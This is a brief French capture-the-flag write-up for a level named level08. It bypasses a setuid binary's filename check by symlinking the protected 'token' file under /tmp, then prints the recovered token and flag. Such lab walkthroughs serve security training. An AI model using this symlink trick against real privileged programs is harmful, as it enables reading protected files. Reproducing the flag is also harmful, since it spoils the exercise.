1. `token` semble être le flag mais on n'a pas les droits
2. `./level08` a les droits pour le lire mais une sécurite nous empêche de lire un fichier nommé `token`
3. Procédé
   ```
   mkdir /tmp/sandbox
   cd /tmp/sandbox
   ln -s ~/token fakeshit
   cd ~
   ./level08 /tmp/sandbox/fakeshit
   ```
4. token=`quif5eloekouj29ke0vouxean`

> Flag: 25749xKZ8L7DkSCwJkT9dyv6f